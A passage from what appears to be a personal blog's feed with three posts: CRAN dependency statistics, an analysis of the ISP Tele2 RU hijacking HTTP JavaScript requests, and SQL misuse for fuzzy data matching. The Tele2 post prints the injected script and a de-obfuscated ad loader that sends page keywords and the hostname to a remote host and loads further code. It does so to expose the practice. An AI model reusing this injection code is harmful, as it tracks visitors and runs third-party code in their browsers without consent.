<p>That's not so bad. 90% of the packages will require less than 63 dependencies if you only install required ones, or 86 if you follow their suggestions.</p>

<p>Are packages with higher numbers of total dependencies themselves depended upon frequently?</p>

<p><img src="totalrev.svg" alt="" class="center" /></p>

<p>The plots here are more or less the same as the ones about dependency tree depth, with outliers being Tidyverse packages or their reverse dependencies. In particular, some popular packages suggest Tidyverse packages as optional dependencies, blowing up the total dependency count when those are requested.</p>

<p>Another thing to note: since most packages don't have many direct dependencies, some packages with deep dependency trees have less total dependencies than other, more shallow ones:</p>

<p><img src="depthndeps.svg" alt="" class="center" /></p>

<p>With a small exception to the depth-dependencies plot, what we observe here probably follows from the <a href="https://cran.r-project.org/web/packages/policies.html"><span class="caps">CRAN </span>policy</a>. Packages are required to be "of publication quality" and provide "non-trivial contribution" (but what constitutes that may depend on the reviewers; e.g. see <a href="https://cran.r-project.org/package=spongebob">spongebob</a>). Packages are required to be portable (which is checked on multiple machines by an extensive set of tests), small, take little time to run their tests. Many paragraphs are devoted to listing behaviour "which might be regarded as malicious or anti-social" (which is, of course, prohibited). Packages with compiled code are also checked by Valgrind and AddressSanitizer+UBSanitizer and may be archived if any uncovered problems aren't fixed.</p>



<p>This is not to say that <span class="caps">CRAN </span>is "better" than <span class="caps">NPM, </span>or R is "better" than JavaScript. Certainly not: what works well for a small group of statisticians has no reason to work well for the much larger worldwide JavaScript community. If anything, <span class="caps">CRAN </span>is <strong>not</strong> without its own problems: despite the median package requiring only 5 total dependencies, heavy tails like <a href="https://cran.r-project.org/package=smartdata">smartdata</a> with 235 required dependencies skew the average towards 20 and the later quantiles towards 60. Tidyverse itself, with 86 total required dependencies, is above 95th quantile by that parameter, but is being heavily advertised as the solution for many things, and it shows as a group of outliers on some of the plots we can make.</p>

<p><strong>See also</strong>: <a href="https://journal.r-project.org/articles/RJ-2023-060/" title="R Journal article">Zhang, Li, &amp; Zhang (2023)</a> give it a more thoughtful formal treatment but from a different perspective.</p>
				</div>
			</content>
		</entry>
<entry>
			<title>Tele2 RU hijacks HTTP connections</title>
			<link href="https://aitap.github.io/2020/07/05/tele2wtf.html" />
			<id>https://aitap.github.io/2020/07/05/tele2wtf.html</id> <!-- unique enough -->
			<updated>2020-07-05T00:00:00Z</updated>
			<content type="xhtml">
				<div xmlns="http://www.w3.org/1999/xhtml"><p>In other news, water is wet, sky has a bluish colour, and 2 + 2 = 4.</p>

<p>I deployed an <span class="caps">HTTP </span>website<sup class="footnote"><a href="#fn1">1</a></sup> and wanted to check whether it works. One of the first things I noticed was that it loaded third-party JavaScript from a domain name that looked like an ad network:</p>

<p><img src="umatrix.png" alt="" class="center" /></p>

<p>Third-party JavaScript ads? On <em>my</em> website? Inconceivable! I must investigate this at once!</p>

<p>I'll skip a few false starts; it took me a while to notice that while the original <span class="caps">HTML </span>code of the page has arrived intact, the <code>ui.js</code> file containing the code for the interactive part of the page was sometimes downloaded twice per page load:</p>

<p><img src="requests.png" alt="" class="center" />
<img src="requests2.png" alt="" class="center" /></p>

<p>And this 725-byte file that arrived without a header indentifying my Web server, prohibited caching and also had <code>Connection: close</code>? That's definitely not mine. It doesn't happen all the time; if I request the same <span class="caps">URL </span>repeatedly, I eventually start getting the original content, but every once in a while a new <code>HTTP GET</code> request for a path ending in <code>.js</code> is hijacked to return something completely different instead:</p>



<pre>
$ curl -s http://example.org/whatever.js | zcat | python3 -c 'import jsbeautifier; jsbeautifier.main()' -
! function() {
    function t() {
        try {
            return window.self !== window.top
        } catch (t) {
            return !0
        }
    }

    function e() {
        var t = document.getElementsByTagName(&quot;head&quot;)[0],
            e = document.createElement(&quot;script&quot;);
        e.src = &quot;http://p.tlrtb.com/ad/base.js?&quot;, e.type = &quot;text/javascript&quot;, t.appendChild(e)
    }

    function n(t) {
        o.parentNode.insertBefore(t, o.nextSibling)
    }

    function r(t) {
        document.write(t.outerHTML)
    }

    function c() {
        for (var t = document.createElement(&quot;script&quot;), e = Array.prototype.slice.call(o.attributes), n = 0; n &lt; e.length; n++) t.setAttribute(e[n].nodeName, e[n].nodeValue);
        return t.src = &quot;http://example.org/whatever.js?&quot;, t
    }
    var o = document.currentScript || document.scripts[document.scripts.length - 1],
        i = c();
    o.async || o.defer ? n(i) : r(i), window.__qsrad || t() || (window.__qsrad = 1, e())
}();
$ torify curl -sI http://example.org/whatever.js | head -n 1
HTTP/1.1 404 Not Found
</pre>



<p>Note that the original <code>.js</code> is transparently fetched by appending a <code>?</code> to the <span class="caps">URL.</span> I'm tempted to add an <code>?</code> to all script <span class="caps">URL</span>s on my own website, just out of spite. Also note that a random Tor exit node (that's usually interested in conducting all sorts of shenanigans on plain-text traffic passing through it) returns the original content of the <span class="caps">URL, </span>while my own <span class="caps">ISP </span>(that's supposed to be interested in passing the traffic unaffected because I'm paying them money) does not!</p>

<p>What does this <code>http://p.tlrtb.com/ad/base.js</code> do that Tele2RU wants to inject into my pages so much? After some manual de-obfuscation, here's what I ended up with:</p>



<pre>
<span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">function</span><span style="color:#000000">() {</span>
    <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">get_keywords</span><span style="color:#000000">() {</span>
        <span style="color:#000000; font-weight:bold">var</span> metas <span style="color:#000000">= [</span>
            <span style="color:#bf0303">&quot;keywords&quot;</span><span style="color:#000000">,</span>
            <span style="color:#bf0303">&quot;description&quot;</span>
        <span style="color:#000000">];</span>
        <span style="color:#000000; font-weight:bold">var</span> keywords <span style="color:#000000">= [];</span>

        <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">words</span><span style="color:#000000">(</span>str<span style="color:#000000">) {</span>
            <span style="color:#000000; font-weight:bold">return</span> str<span style="color:#000000">.</span><span style="color:#010181">replace</span><span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">/[^a-zA-Z0-9а-яА-Я-ёЁ ]+/g</span><span style="color:#000000">,</span> <span style="color:#bf0303">'</span><span style="color:#ff00ff">\x20</span><span style="color:#bf0303">'</span><span style="color:#000000">).</span><span style="color:#010181">replace</span><span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">/\s\s+/g</span><span style="color:#000000">,</span> <span style="color:#bf0303">'</span><span style="color:#ff00ff">\x20</span><span style="color:#bf0303">'</span><span style="color:#000000">).</span><span style="color:#010181">replace</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot; - &quot;</span><span style="color:#000000">,</span> <span style="color:#bf0303">'</span><span style="color:#ff00ff">\x20</span><span style="color:#bf0303">'</span><span style="color:#000000">).</span><span style="color:#010181">trim</span><span style="color:#000000">().</span><span style="color:#010181">split</span><span style="color:#000000">(</span><span style="color:#bf0303">'</span><span style="color:#ff00ff">\x20</span><span style="color:#bf0303">'</span><span style="color:#000000">);</span>
        <span style="color:#000000">}</span>
        <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span>document<span style="color:#000000">.</span>title<span style="color:#000000">) {</span>
            keywords <span style="color:#000000">=</span> keywords<span style="color:#000000">.</span><span style="color:#010181">concat</span><span style="color:#000000">(</span><span style="color:#010181">words</span><span style="color:#000000">(</span>document<span style="color:#000000">.</span>title<span style="color:#000000">));</span>
        <span style="color:#000000">}</span>
        <span style="color:#000000; font-weight:bold">var</span> meta_tags <span style="color:#000000">=</span> document<span style="color:#000000">.</span><span style="color:#010181">getElementsByTagName</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;meta&quot;</span><span style="color:#000000">);</span>
        <span style="color:#000000; font-weight:bold">for</span> <span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">var</span> i <span style="color:#000000">=</span> <span style="color:#b07e00">0</span><span style="color:#000000">;</span> i <span style="color:#000000">&lt;</span> meta_tags<span style="color:#000000">.</span>length<span style="color:#000000">;</span> i<span style="color:#000000">++) {</span>
            <span style="color:#000000; font-weight:bold">var</span> mtag <span style="color:#000000">=</span> meta_tags<span style="color:#000000">[</span>i<span style="color:#000000">];</span>
            <span style="color:#000000; font-weight:bold">var</span> mname <span style="color:#000000">=</span> mtag<span style="color:#000000">.</span><span style="color:#010181">getAttribute</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;name&quot;</span><span style="color:#000000">);</span>
            <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span>mname <span style="color:#000000">&amp;&amp; (</span>metas<span style="color:#000000">.</span><span style="color:#010181">indexOf</span><span style="color:#000000">(</span>mname<span style="color:#000000">.</span><span style="color:#010181">toLowerCase</span><span style="color:#000000">()) != -</span><span style="color:#b07e00">1</span><span style="color:#000000">)) {</span>
                keywords <span style="color:#000000">=</span> keywords<span style="color:#000000">.</span><span style="color:#010181">concat</span><span style="color:#000000">(</span><span style="color:#010181">words</span><span style="color:#000000">(</span>mtag<span style="color:#000000">.</span><span style="color:#010181">getAttribute</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;content&quot;</span><span style="color:#000000">)));</span>
            <span style="color:#000000">}</span>
        <span style="color:#000000">}</span>
        <span style="color:#000000; font-weight:bold">for</span> <span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">var</span> i <span style="color:#000000">=</span> <span style="color:#b07e00">0</span><span style="color:#000000">;</span> i <span style="color:#000000">&lt;</span> keywords<span style="color:#000000">[</span><span style="color:#bf0303">&quot;length&quot;</span><span style="color:#000000">];</span> i<span style="color:#000000">++) {</span>
            <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span>keywords<span style="color:#000000">[</span>i<span style="color:#000000">].</span>length <span style="color:#000000">&gt;</span> <span style="color:#b07e00">40</span><span style="color:#000000">) {</span>
                keywords<span style="color:#000000">[</span>i<span style="color:#000000">] =</span> keywords<span style="color:#000000">[</span>i<span style="color:#000000">].</span><span style="color:#010181">substr</span><span style="color:#000000">(</span><span style="color:#b07e00">0</span><span style="color:#000000">,</span> <span style="color:#b07e00">40</span><span style="color:#000000">);</span>
            <span style="color:#000000">}</span>
        <span style="color:#000000">}</span>
        <span style="color:#000000; font-weight:bold">var</span> ret <span style="color:#000000">=</span> <span style="color:#bf0303">''</span><span style="color:#000000">;</span>
        <span style="color:#000000; font-weight:bold">for</span> <span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">var</span> i <span style="color:#000000">=</span> <span style="color:#b07e00">1</span><span style="color:#000000">;</span> i <span style="color:#000000">&lt;</span> keywords<span style="color:#000000">.</span>length <span style="color:#000000">+</span> <span style="color:#b07e00">1</span><span style="color:#000000">;</span> i<span style="color:#000000">++) {</span>
            <span style="color:#000000; font-weight:bold">var</span> slice <span style="color:#000000">=</span> keywords<span style="color:#000000">.</span><span style="color:#010181">slice</span><span style="color:#000000">(</span><span style="color:#b07e00">0</span><span style="color:#000000">,</span> i<span style="color:#000000">);</span>
            <span style="color:#000000; font-weight:bold">var</span> squeezed <span style="color:#000000">=</span> slice<span style="color:#000000">[</span><span style="color:#bf0303">&quot;join&quot;</span><span style="color:#000000">](</span><span style="color:#bf0303">','</span><span style="color:#000000">);</span>
            <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span>squeezed<span style="color:#000000">.</span>length <span style="color:#000000">&lt;=</span> <span style="color:#b07e00">200</span><span style="color:#000000">) {</span>
                ret <span style="color:#000000">=</span> squeezed<span style="color:#000000">;</span>
            <span style="color:#000000">}</span>
        <span style="color:#000000">}</span>

        <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">hostname</span><span style="color:#000000">() {</span>
            <span style="color:#000000; font-weight:bold">return</span> <span style="color:#bf0303">&quot;,%%&quot;</span> <span style="color:#000000">+</span> window<span style="color:#000000">.</span>location<span style="color:#000000">.</span>hostname<span style="color:#000000">.</span><span style="color:#010181">replace</span><span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">/\./g</span><span style="color:#000000">,</span> <span style="color:#bf0303">'%'</span><span style="color:#000000">) +</span> <span style="color:#bf0303">'%%'</span><span style="color:#000000">;</span>
        <span style="color:#000000">}</span>
        <span style="color:#000000; font-weight:bold">return</span> ret<span style="color:#000000">.</span><span style="color:#010181">trim</span><span style="color:#000000">() +</span> <span style="color:#010181">hostname</span><span style="color:#000000">();</span>
    <span style="color:#000000">}</span>

    <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">load_script</span><span style="color:#000000">(</span>src<span style="color:#000000">) {</span>
        <span style="color:#000000; font-weight:bold">var</span> script <span style="color:#000000">=</span> document<span style="color:#000000">.</span><span style="color:#010181">createElement</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;script&quot;</span><span style="color:#000000">);</span>
        script<span style="color:#000000">.</span>src <span style="color:#000000">=</span> src<span style="color:#000000">;</span>
        <span style="color:#000000; font-weight:bold">var</span> last_script <span style="color:#000000">=</span> document<span style="color:#000000">.</span>currentScript <span style="color:#000000">||</span> document<span style="color:#000000">.</span>scripts<span style="color:#000000">[</span>document<span style="color:#000000">.</span>scripts<span style="color:#000000">.</span>length <span style="color:#000000">-</span> <span style="color:#b07e00">1</span><span style="color:#000000">];</span>
        last_script<span style="color:#000000">.</span>parentNode<span style="color:#000000">.</span><span style="color:#010181">insertBefore</span><span style="color:#000000">(</span>script<span style="color:#000000">,</span> last_script<span style="color:#000000">.</span>nextSibling<span style="color:#000000">);</span>
    <span style="color:#000000">}</span>

    <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">utcoffset</span><span style="color:#000000">() {</span>
        <span style="color:#000000; font-weight:bold">return</span> <span style="color:#000000">-</span><span style="color:#000000; font-weight:bold">new</span> <span style="color:#010181">Date</span><span style="color:#000000">().</span><span style="color:#010181">getTimezoneOffset</span><span style="color:#000000">();</span>
    <span style="color:#000000">}</span>

    <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">make_iframe</span><span style="color:#000000">(</span>uid<span style="color:#000000">) {</span>
        <span style="color:#000000; font-weight:bold">var</span> div <span style="color:#000000">=</span> document<span style="color:#000000">.</span><span style="color:#010181">createElement</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;div&quot;</span><span style="color:#000000">);</span>
        div<span style="color:#000000">.</span>innerHTML <span style="color:#000000">=</span> <span style="color:#bf0303">&quot;&lt;!--Start of Floodlight Tag: Please do not remove Activity name of this tag: sync_activity URL of the webpage &quot;</span> <span style="color:#000000">+</span>
            <span style="color:#bf0303">&quot;where the tag is expected to be placed: This tag must be placed between the &lt;body&gt; and &lt;/body&gt; tags, as close as possible &quot;</span> <span style="color:#000000">+</span>
            <span style="color:#bf0303">&quot;to the opening tag. Creation Date: 04/22/2020--&gt;&lt;script type=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">text/javascript</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">&gt;var axel = Math.random() +</span> <span style="color:#ff00ff">\&quot;\&quot;</span><span style="color:#bf0303">;var a = &quot;</span> <span style="color:#000000">+</span>
            <span style="color:#bf0303">&quot;axel * 10000000000000;document.write(&quot;</span> <span style="color:#000000">+</span> <span style="color:#bf0303">'&lt;iframe</span><span style="color:#ff00ff">\x20</span><span style="color:#bf0303">src=</span><span style="color:#ff00ff">\x22</span><span style="color:#bf0303">https://10028645.fls.doubleclick.net/activityi;src=10028645;'</span> <span style="color:#000000">+</span>
            <span style="color:#bf0303">'type=syncd0;cat=sync_0;u1='</span> <span style="color:#000000">+</span> uid <span style="color:#000000">+</span> <span style="color:#bf0303">&quot;;dc_lat=;dc_rdid=;tag_for_child_directed_treatment=;tfua=;npa=;ord=&quot;</span> <span style="color:#000000">+</span> <span style="color:#bf0303">&quot; + a + &quot;</span> <span style="color:#000000">+</span>
            <span style="color:#bf0303">&quot;?</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">width=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">1</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">height=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">1</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">frameborder=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">0</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">style=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">display:none</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">&gt;&lt;/iframe&gt;&quot; + &quot;);&lt;/script&gt;&lt;noscript&gt;&lt;iframe src=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">&quot;</span> <span style="color:#000000">+</span>
            <span style="color:#bf0303">&quot;https://10028645.fls.doubleclick.net/activityi;src=10028645;type=syncd0;cat=sync_0;u1=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">&quot;</span> <span style="color:#000000">+</span> uid <span style="color:#000000">+</span> <span style="color:#bf0303">&quot;</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">;dc_lat=;dc_rdid=;&quot;</span> <span style="color:#000000">+</span>
            <span style="color:#bf0303">&quot;tag_for_child_directed_treatment=;tfua=;npa=;ord=1?</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">width=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">1</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">height=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">1</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">frameborder=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">0</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">style=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">display:none</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">&quot;</span> <span style="color:#000000">+</span>
            <span style="color:#bf0303">&quot;&gt;&lt;/iframe&gt;&lt;/noscript&gt;&lt;!-- End of Floodlight Tag: Please do not remove --&gt;&quot;</span><span style="color:#000000">;</span>
        document<span style="color:#000000">.</span>body<span style="color:#000000">.</span><span style="color:#010181">append</span><span style="color:#000000">(</span>div<span style="color:#000000">);</span>
    <span style="color:#000000">}</span>
    <span style="color:#000000; font-weight:bold">var</span> p <span style="color:#000000">=</span> <span style="color:#bf0303">''</span><span style="color:#000000">;</span>
    <span style="color:#000000; font-weight:bold">var</span> datasync <span style="color:#000000">=</span> <span style="color:#000000; font-weight:bold">false</span><span style="color:#000000">;</span>
    <span style="color:#000000; font-weight:bold">var</span> uid <span style="color:#000000">=</span> <span style="color:#bf0303">'aIMxoXBLDRyEzMqIjfKa0Q=='</span><span style="color:#000000">;</span>
    <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span>datasync<span style="color:#000000">) {</span>
        <span style="color:#010181">make_iframe</span><span style="color:#000000">(</span>uid<span style="color:#000000">);</span>
    <span style="color:#000000">}</span>
    <span style="color:#000000; font-weight:bold">var</span> adbase_url <span style="color:#000000">=</span> <span style="color:#bf0303">&quot;http://p.tlrtb.com/ad/base.js?&quot;</span> <span style="color:#000000">+ (</span>p <span style="color:#000000">?</span> p <span style="color:#000000">+</span> <span style="color:#bf0303">'&amp;'</span> <span style="color:#000000">:</span> <span style="color:#bf0303">''</span><span style="color:#000000">) +</span> <span style="color:#bf0303">&quot;kw=&quot;</span> <span style="color:#000000">+</span> <span style="color:#010181">encodeURIComponent</span><span style="color:#000000">(</span><span style="color:#010181">get_keywords</span><span style="color:#000000">()) +</span> <span style="color:#bf0303">&quot;&amp;utcoffset=&quot;</span> <span style="color:#000000">+</span> <span style="color:#010181">utcoffset</span><span style="color:#000000">();</span>
    <span style="color:#010181">load_script</span><span style="color:#000000">(</span>adbase_url<span style="color:#000000">);</span>
<span style="color:#000000">}());</span>
</pre>



<p>Yeah, it takes the hostname of the page you are viewing, the keywords from the title and <code>&lt;meta&gt;</code> tags describing the page for the search engines and sends it off to the same remote server, expecting more JavaScript to load and execute. What does it do then? I tried feeding some data to that address, but only got <code>HTTP 502 Bad Gateway</code> in reply. Perhaps it only returns non-errors on certain keywords it considers especially interesting. Who knows?</p>

<p>Speaking of errors,</p>



<pre>
$ curl -I http://example.org/does_not_exist
HTTP/1.1 301 Moved Permanently
Location: http://404.services/404/
$ torify curl -sI http://example.org/does_not_exist | head -n 1
HTTP/1.1 404 Not Found
</pre>



<p>Yes, everybody likes it when they get a page with more ads instead of an honest 404! Not.</p>

<p>Unfortunately, this shameful practice is now considered the norm by mobile <span class="caps">ISP</span>s and can only be expected to get worse. Make sure you always have an ad-blocker installed; block unknown third-party resources by default; and yes, use <span class="caps">HTTPS.</span> This prevents almost everyone from spying on you... except the page owners themselves and the <span class="caps">CDN </span>(something something cloudflare something <span class="caps">MITM</span>). But that's another story.</p>

<p class="footnote" id="fn1"><sup>1</sup> Yes, the <span class="caps">WWW </span>should be all encrypted (or at least signed), and everyone should beware J. Random Script Kiddie, Jr. with a Wi-Fi pentester toolkit. That's not the point. There are no Wi-Fi attacks in this story.</p>
				</div>
			</content>
		</entry>
<entry>
			<title>Some things should not be expressed in SQL</title>
			<link href="https://aitap.github.io/2019/03/30/sql.html" />
			<id>https://aitap.github.io/2019/03/30/sql.html</id> <!-- unique enough -->
			<updated>2019-03-30T00:00:00Z</updated>
			<content type="xhtml">
				<div xmlns="http://www.w3.org/1999/xhtml"><p>I have a confession to make.</p>

<p>I have been heavily abusing <span class="caps">SQL.</span> It had started a few years ago when I wanted to make a website and some guy told me to try soft stuff like <span class="caps">SQL</span>ite. It was easy to get hold of, the promised effects happened very easily (want full text search on a small website? <code>CREATE VIRTUAL TABLE search USING fts4(fulltext, title, tokenize=unicode61)'</code> and you are done!), and there seemed to be no withdrawal.</p>

<p>Since them I have been using <span class="caps">SQL</span>ite in every few of my projects (despite telling myself that I can get by without it), sometimes even as a dumb key-value store with no indexes (tried <span class="caps">BDB, </span>but the comedowns caused by incorrect linking between different compilers made my application vomit, so I stopped).</p>

<p>This brings us to my latest project. I have two text files, one 1.5M gzipped, another 25M xz-compressed, containing fundamental physical data obtained by different methods and compiled by different people. The datasets partially intersect - this is a fact - but it is impossible to find exact relations between entries with 100% because their string descriptions were produced using two different theories and encoded using different (and not precisely specified) encoding rules.</p>

<p>Instead, I have to resort to imprecice matching by parameter values: if the values (of type <span class="caps">REAL, </span>of course) are "close enough", I should consider them the same. How close is close enough? Let's find out: for each line from one dataset, let's find out the mininal difference to any of the lines from the other dataset:</p>



<pre>
<span style="color:#000000; font-weight:bold">create table</span> minimal_cost <span style="color:#000000; font-weight:bold">as</span>
<span style="color:#000000; font-weight:bold">select</span>
	a.<span style="color:#000000; font-weight:bold">id as</span> a_id<span style="color:#000000">,</span> b.<span style="color:#000000; font-weight:bold">id as</span> b_id<span style="color:#000000">,</span>
	a.param1 <span style="color:#000000; font-weight:bold">as</span> a_param1<span style="color:#000000">,</span> b.param1 <span style="color:#000000; font-weight:bold">as</span> b_param1
	a.param2 <span style="color:#000000; font-weight:bold">as</span> a_param2<span style="color:#000000">,</span> b.param2 <span style="color:#000000; font-weight:bold">as</span> b_param2
<span style="color:#000000; font-weight:bold">from</span> physparams a<span style="color:#000000">,</span> physparams b
<span style="color:#000000; font-weight:bold">where</span>
	a.src_id <span style="color:#000000">=</span> <span style="color:#b07e00">2</span>
	<span style="color:#000000; font-weight:bold">and</span> b.src_id <span style="color:#000000">=</span> <span style="color:#b07e00">1</span>
	<span style="color:#000000; font-weight:bold">and</span> <span style="color:#000000">(</span>
		<span style="color:#838183; font-style:italic">-- thankfully, param1 and param2 have similar scales, or I'd have to invent a complex cost function</span>
		<span style="color:#000000; font-weight:bold">select min</span><span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">abs</span><span style="color:#000000">(</span>bb.param1<span style="color:#000000">-</span>a.param1<span style="color:#000000">) +</span> <span style="color:#000000; font-weight:bold">abs</span><span style="color:#000000">(</span>bb.param2<span style="color:#000000">-</span>a.param2<span style="color:#000000">))</span>
		<span style="color:#000000; font-weight:bold">from</span> physparams bb
		<span style="color:#000000; font-weight:bold">where</span>
			bb.src_id <span style="color:#000000">=</span> <span style="color:#b07e00">1</span>
			<span style="color:#000000; font-weight:bold">and</span> bb.param3 <span style="color:#000000">=</span> a.param4
			<span style="color:#000000; font-weight:bold">and</span> bb.param4 <span style="color:#000000">=</span> a.param4 <span style="color:#838183; font-style:italic">-- these are INTEGER</span>
	<span style="color:#000000">) = (</span><span style="color:#000000; font-weight:bold">abs</span><span style="color:#000000">(</span>b.param1<span style="color:#000000">-</span>a.param1<span style="color:#000000">) +</span> <span style="color:#000000; font-weight:bold">abs</span><span style="color:#000000">(</span>b.param2<span style="color:#000000">-</span>a.param2<span style="color:#000000">))</span>
<span style="color:#000000">;</span>
</pre>



<p>This is about the opposite of relational databases do well: instead of using an established relation between tuples helped by indices, the database engine has to find one out, and there is no possible index one could use to speed it up. Well, apart from computing the whole <img src="data:image/gif;base64,R0lGODdhOAATAPMAAP///9XV1crKyr+/v7W1tampqZKSkm5ubmFhYVRUVEZGRgAAAAAAAAAAAAAAAAAAACwAAAAAOAATAAAE0RDISasNy+o9V+Dghn1hOZaAcCzsIlQnanohdgzSgGTdK6MC3iaIoyAUxdivRtMIEAfLQIGQBJcy1+ZYrLAkWrAr+MV8O+MW5SqlaqZVgDBo2L0WBe18Udd7NVyASGAdBAgIPjskQguGiIQUQpGSE3AdXkVEl5FdlJQSgRWhchQxMWwSp55vCgk+OTuRa3sdA2yoC7aMGwtUOAMrr2CvYXLEeT7FeGGoUissB8JWu5upZ6QTZj1YME3cIt7fxuJDn9xK5NYk6QDo4u7pGOxy6xQRADsAAAAAAAAAAAA=" /> array of distances, which would have around <img src="data:image/gif;base64,R0lGODdhOAAQAPIAAP///9XV1crKyr+/v6mpqWFhYQAAAAAAACwAAAAAOAAQAAADnQi63P7wDcOCMSHqzdctiyUIWGeeDKUYgkKexoB2KlDb1VU2ha5LN4Dlkkl5jAoRgFR03QhBmwEUYi13q6PW1nKmmpZm42b1bsnb7CMcQSPVuHMXPp4/3Ola+ZW0kqgNbG1vdDUiTDkXUA98HnhxWh8XfVh3d3ZShEFRKI2EEI+QM0KVaaApc540LYgrehw3Sq0nQ5WTdA6ShjpiHQkAOwAAAAAAAAAAAA==" /> entries for the two datasets.</p>

<p>I had abused <span class="caps">SQL</span>ite's ability to <code>select id, min(whatever)</code> and have the id of the row that had <strong>the</strong> minimal value of <code>whatever</code> and finished the query overnight on a small subset of the data. For the whole dataset, I spent a whole day looking at PostgreSQL eating one <span class="caps">CPU </span>core.</p>

<p>After a while, it dawned on me that I was acting under the <span class="caps">SQL </span>influence and it was going to harm me if I didn't stop right now. So I killed the query, blew the dust off good ol' Perl and dumped everything I wanted to compare into a binary file:</p>



<pre>
<span style="color:#000000; font-weight:bold">my</span> <span style="color:#0057ae">$get</span> <span style="color:#000000">=</span> <span style="color:#0057ae">$db</span><span style="color:#000000">-&gt;</span><span style="color:#010181">prepare</span><span style="color:#000000">(</span><span style="color:#bf0303">'select id, param1, param2, param3, param4 from physparams where src_id = ?'</span><span style="color:#000000">);</span>
<span style="color:#0057ae">$get</span><span style="color:#000000">-&gt;</span><span style="color:#010181">bind_columns</span><span style="color:#000000">(</span>\<span style="color:#000000; font-weight:bold">my</span><span style="color:#000000">(</span><span style="color:#0057ae">$id</span><span style="color:#000000">,</span> <span style="color:#0057ae">$param1 $param2</span><span style="color:#000000">,</span> <span style="color:#0057ae">$param3</span><span style="color:#000000">,</span> <span style="color:#0057ae">$param4</span><span style="color:#000000">));</span>

<span style="color:#000000; font-weight:bold">open my</span> <span style="color:#0057ae">$fh</span><span style="color:#000000">,</span> <span style="color:#bf0303">&quot;&gt;:raw&quot;</span><span style="color:#000000">,</span> <span style="color:#bf0303">&quot;db1.bin&quot;</span><span style="color:#000000">;</span>
<span style="color:#0057ae">$get</span><span style="color:#000000">-&gt;</span><span style="color:#010181">execute</span><span style="color:#000000">(</span><span style="color:#b07e00">1</span><span style="color:#000000">);</span>
<span style="color:#000000; font-weight:bold">print</span> <span style="color:#0057ae">$fh</span> <span style="color:#000000; font-weight:bold">pack</span> <span style="color:#bf0303">&quot;LLLdd&quot;</span><span style="color:#000000">,</span> <span style="color:#0057ae">$id</span><span style="color:#000000">,</span> <span style="color:#0057ae">$param3</span><span style="color:#000000">,</span> <span style="color:#0057ae">$param4</span><span style="color:#000000">,</span> <span style="color:#0057ae">$param1</span><span style="color:#000000">,</span> <span style="color:#0057ae">$param2</span>
	<span style="color:#000000; font-weight:bold">while</span> <span style="color:#0057ae">$get</span><span style="color:#000000">-&gt;</span><span style="color:#010181">fetch</span><span style="color:#000000">;</span>
</pre>



<p>then powered up C and ran the <img src="data:image/gif;base64,R0lGODdhOAATAPMAAP///9XV1crKyr+/v7W1tampqZKSkm5ubmFhYVRUVEZGRgAAAAAAAAAAAAAAAAAAACwAAAAAOAATAAAE0RDISasNy+o9V+Dghn1hOZaAcCzsIlQnanohdgzSgGTdK6MC3iaIoyAUxdivRtMIEAfLQIGQBJcy1+ZYrLAkWrAr+MV8O+MW5SqlaqZVgDBo2L0WBe18Udd7NVyASGAdBAgIPjskQguGiIQUQpGSE3AdXkVEl5FdlJQSgRWhchQxMWwSp55vCgk+OTuRa3sdA2yoC7aMGwtUOAMrr2CvYXLEeT7FeGGoUissB8JWu5upZ6QTZj1YME3cIt7fxuJDn9xK5NYk6QDo4u7pGOxy6xQRADsAAAAAAAAAAAA=" /> operation on raw data:</p>



<pre>
<span style="color:#010181">/* auxillary code omitted for the sake of compactness, substitute declarations where appropriate */</span>
struct entry <span style="color:#000000">{</span>
	uint32_t id<span style="color:#000000">,</span> param3<span style="color:#000000">,</span> param4<span style="color:#000000">;</span>
	double param1<span style="color:#000000">,</span> param2<span style="color:#000000">;</span>
<span style="color:#000000">};</span>

